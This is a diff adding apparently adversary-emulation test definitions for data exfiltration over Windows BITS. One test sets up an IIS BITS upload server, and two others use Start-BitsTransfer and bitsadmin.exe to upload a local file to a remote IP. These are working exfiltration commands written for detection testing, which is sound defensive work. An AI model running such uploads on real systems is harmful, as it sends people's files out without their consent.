@@ -1,0 +1,186 @@
+attack_technique: Bitsadmin Upload [Data Exfilitration]
+display_name: BitsUpload [Data Exfilitration] via PowerShell Cmdlets and Bitsadmin.exe
+atomic_tests:
+
+- name: Building BITS Server Exetension 
+  auto_generated_guid: d15978a6-e9ed-4fd2-922b-428edf0a55a5
+  description: To complete the next two Bits Upload tests using (Commandlets or bitsadmin.exe), a Bits Server extension Server must first be installed on a different machine that supports the BITS Server extension feature which in my case was [Windows Server 2019]
+   This Scripts installs and creates the following
+   1) Install IIS-BITS Features
+   2) Creates a temp directory to be assigned later to the default webapp (this is the the directory where BITs Receive the Exfilitrated Data) 
+   3) Enable Directory Browsing to the Virtual Directory
+   4) Enable BITS Uploads Feature to the Virtual Directory
+   5) Also it supports Uninstallation.
+  
+  supported_platforms:
+  - windows
+  
+  input_arguments:
+    BitsSrvExten_Script:
+      description: Path to BItsUpload script
+      type: string
+      default: $env:TEMP/BITS_Upload.ps1
+        
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      BitS_Upload.ps1 must exists on the HardDisk in Temp Directory
+    prereq_command: |
+      if (Test-Path "#{BitsSrvExten_Script}") { exit 0} else { exit 1}
+    get_prereq_command: |
+       Invoke-WebRequest 'URL_OF_BITSUPloads_Script' -OutFile "#{BitsSrvExten_Script}"
+ 
+  executor:
+    command: |
+      &$env:TEMP\BITS_Upload.ps1 -SelectMode Install; 
+        try{
+        $HTTP_Request = [System.Net.WebRequest]::Create('http://localhost/test/');
+        $HTTP_Response = $HTTP_Request.GetResponse();
+        $HTTP_Status = [int]$HTTP_Response.StatusCode;
+        if($HTTP_Status -eq '200') {Write-Host "WebApp has been successfully installed"}}
+        catch{
+        Wirte-Host "Failed to Installed WebApp"
+        }
+      
+    cleanup_command: |
+      &$env:TEMP/BITS_Upload.ps1 -SelectMode Uninstall
+      Remove-Item -Path #{BitsSrvExten_Script} -Force  | Out-Null
+      
+    name: powershell
+    elevation_required: true
+    
+
+- name: Bitsadmin Upload via PowerShell Cmdlets
+  auto_generated_guid: 21b0dd12-a3ee-4471-9ff1-ef65f3cf7d8a
+  description: |
+    This test simulates an adversary leveraging bitsadmin Comandlets to upload a file to the remote BITS Server that we created in the previous Test.
+  supported_platforms:
+    - windows
+    
+  input_arguments:
+    BITS_SrvIP:
+      description: IP of Bits Server Extension which will be used to receive the exfilitrated data.
+      type: string
+      default: 192.168.44.128
+      
+    FileToExfilitrate:
+      description: A sample file to be uploaded to the remove server.
+      type: string
+      default: $env:TEMP/Part1.zip     
+      
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      A sample file with a name Part1.zip must exists at Temp Directory
+    prereq_command: |
+      if (Test-Path "#{FileToExfilitrate}") { exit 0} else { exit 1}
+    get_prereq_command: |
+      Copy-Item -Path $env:windir/system32/calc.exe -Destination $env:TEMP/Part1.zip | Out-Null
+
+  - description: |
+      The Connectivity to the remote Bits Server is lost, please ensure that Bits server is up!
+  
+    prereq_command: |
+        try {
+        $HTTP_Request = [System.Net.WebRequest]::Create('http://#{BITS_SrvIP}/test/');
+        $HTTP_Response = $HTTP_Request.GetResponse();
+        $HTTP_Status = [int]$HTTP_Response.StatusCode;
+        if($HTTP_Status -eq '200') {exit 0}
+        }
+        catch {exit 1}
+    
+    get_prereq_command: |   
+      write-host "The Connectivity to the remote Bits Server is lost, please ensure that Bits server is up!"
+    #get_prereq_command: |
+      #Write-Host "No connectivity to the remote url"
+
+  - description: |
+      Check if Part1.zip is present on the remote server or not.
+    prereq_command: |
+        try{
+        $HTTP_Request = [System.Net.WebRequest]::Create('http://#{BITS_SrvIP}/test/Part1.zip');
+        $HTTP_Response = $HTTP_Request.GetResponse();
+        $HTTP_Status = [int]$HTTP_Response.StatusCode;
+        if($HTTP_Status -eq '200') {exit 1}} catch{exit 0} 
+    get_prereq_command: | 
+      write-Host "Please remove the file Part1.zip on the remove Server as the process does not overwrite the existing file"
+      
+  executor:
+    command: |
+      Start-BitsTransfer -TransferType Upload -Source "#{FileToExfilitrate}" -Destination "http://#{BITS_SrvIP}/test/Part1.zip"
+      write-host "Please refer to 'http://#{BITS_SrvIP}/test/Part1.zip' to check your Data Leak"
+    cleanup_command: |
+      Remove-Item -Path #{FileToExfilitrate} -Force  
+    name: powershell
+    elevation_required: true
+    
+    
+- name: BitsUpload [Data Exfilitration] via Bitsadmin.exe
+  auto_generated_guid: e1312e08-b01e-4231-b620-c21d99739b44
+  description: |
+    This test simulates an adversary leveraging bitsadmin.exe to upload a file to the remote BITS Server that we created in the previous Test. 
+    
+  supported_platforms:
+    - windows
+    
+  input_arguments:
+    BITS_SrvIP:
+      description: IP of Bits Server Extension which will be used to receive the exfilitrated data.
+      type: string
+      default: 192.168.44.128
+      
+    FileToExfilitrate:
+      description: A sample file to be uploaded to the remove server.
+      type: string
+      default: $env:TEMP/Part2.zip     
+      
+  dependency_executor_name: powershell
+  dependencies:
+  - description: |
+      A sample file with a name Part1.zip must exists at Temp Directory
+    prereq_command: |
+      if (Test-Path "#{FileToExfilitrate}") { exit 0} else { exit 1}
+    get_prereq_command: | 
+      Copy-Item -Path $env:windir/system32/calc.exe -Destination #{FileToExfilitrate} | Out-Null  
+      
+  - description: |
+      The Connectivity to the remote Bits Server is lost, please ensure that Bits server is up!
+    prereq_command: | 
+        try{
+        $HTTP_Request = [System.Net.WebRequest]::Create('http://#{BITS_SrvIP}/test/');
+        $HTTP_Response = $HTTP_Request.GetResponse();
+        $HTTP_Status = [int]$HTTP_Response.StatusCode;
+        if($HTTP_Status -eq '200') {exit 0}
+        }
+        catch {exit 1}  
+    get_prereq_command: |   
+      write-host "The Connectivity to the remote Bits Server is lost, please ensure that Bits server is up!"
+      
+  - description: |
+      Check if Part2.zip is present on the remote server or not.
+    prereq_command: |
+        try{
+        $HTTP_Request = [System.Net.WebRequest]::Create('http://#{BITS_SrvIP}/test/Part2.zip');
+        $HTTP_Response = $HTTP_Request.GetResponse();
+        $HTTP_Status = [int]$HTTP_Response.StatusCode;
+        if($HTTP_Status -eq '200') {exit 1}}
+        catch{exit 0} 
+    get_prereq_command: | 
+      write-Host "Please remove the file Part2.zip on the remove Server as the process does not overwrite the existing file"
+
+  executor:
+    command: |
+      bitsadmin.exe /cancel test | Out-Null
+      bitsadmin /create /UPLOAD test | Out-Null
+      bitsadmin /addfile test 'http://#{BITS_SrvIP}/test/Part2.zip' #{FileToExfilitrate} | Out-Null
+      bitsadmin /Resume test | Out-Null
+      write-host "Please refer to 'http://#{BITS_SrvIP}/test/Part2.zip' to check your Data Leak"
+      
+    cleanup_command: |
+      Remove-Item -Path #{FileToExfilitrate} -Force  
+      bitsadmin /complete test | Out-Null
+      
+    name: powershell
+    elevation_required: true
+ 
+    
